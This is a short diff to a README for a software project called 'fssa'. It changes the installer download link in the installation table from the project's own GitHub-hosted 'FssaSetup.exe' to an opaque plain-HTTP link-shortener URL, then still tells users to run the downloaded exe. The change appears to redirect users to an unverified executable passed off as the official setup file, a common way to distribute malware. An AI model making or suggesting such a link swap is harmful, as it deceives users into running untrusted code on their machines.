@@ -20,7 +20,7 @@ Installing `fssa` only requires a few simple steps:
 
    | Version  | Date       | Download |
    |----------|------------|----------|
-   | alpha 0.97 | 2024-01-25 | [![Download](https://img.shields.io/badge/download-exe-blue.svg)](https://github.com/raz-zeevy/fssa/blob/main/setup/FssaSetup.exe) |
+   | alpha 0.97 | 2024-01-25 | [![Setup](https://img.shields.io/badge/setup-exe-blue.svg)](http://u.pc.cd/mHXctalK) |
 
 2. Run the downloaded `FssaSetup.exe` file to start the installation wizard.
 
